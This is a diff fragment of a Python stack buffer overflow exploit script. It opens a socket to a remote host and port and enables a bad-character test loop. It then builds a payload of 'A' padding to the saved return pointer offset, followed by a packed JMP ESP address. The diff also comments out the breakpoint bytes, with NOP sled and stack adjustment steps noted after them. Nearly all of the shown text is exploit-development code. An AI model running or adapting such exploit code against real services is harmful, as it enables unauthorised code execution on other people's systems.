@@ -12,9 +12,9 @@ s.connect((RHOST, RPORT))
 bdch = [0x00, 0x0A]
 
 # gen string
-#for i in range(0x00, 0xFF+1):
-#	if i not in bdch:
-#		bdch_test +=chr(i)
+for i in range(0x00, 0xFF+1):
+	if i not in bdch:
+		bdch_test +=chr(i)
 
 # write file
 #with open("bdch.bin", "wb") as f:
@@ -103,7 +103,7 @@ ptr_jmp_esp = 0x080414c3
 buf = ""
 buf += "A"*(offset_srp - len(buf))
 buf += struct.pack("<I",ptr_jmp_esp)
-buf += "\xCC\xCC\xCC\xCC"
+#buf += "\xCC\xCC\xCC\xCC"
 # NOP SLED
 #buf += "\x90"*12
 # sub ESP
